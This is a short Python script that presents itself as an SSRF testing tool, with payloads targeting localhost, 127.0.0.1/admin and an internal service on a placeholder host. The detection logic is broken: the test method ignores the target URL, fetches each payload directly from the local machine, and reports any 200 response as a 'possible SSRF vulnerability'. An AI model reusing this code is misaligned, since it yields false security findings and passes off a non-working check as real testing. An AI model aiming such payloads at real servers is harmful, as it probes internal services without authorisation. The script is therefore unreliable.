import requests

class SSRFTestingTool:
    def __init__(self):
        self.payloads = [
            "http://localhost:8080",
            "http://127.0.0.1/admin",
            "http://target-website.com/internal-service"
        ]

    def generate_payload(self):
        print("SSRF Payloads:")
        for payload in self.payloads:
            print(payload)

    def test_ssrf(self, url, payload):
        # Send an SSRF payload to the server
        print(f"Testing SSRF with payload: {payload}")
        try:
            response = requests.get(payload)
            print(f"Response status code: {response.status_code}")
            if response.status_code == 200:
                print("Possible SSRF vulnerability detected!")
        except requests.exceptions.RequestException as e:
            print(f"Error with SSRF payload: {e}")

if __name__ == "__main__":
    ssrf_tool = SSRFTestingTool()
    ssrf_tool.generate_payload()

    # Example: Test a URL
    test_url = "http://target-website.com/ssrf-test"
    ssrf_tool.test_ssrf(test_url, ssrf_tool.payloads[0])
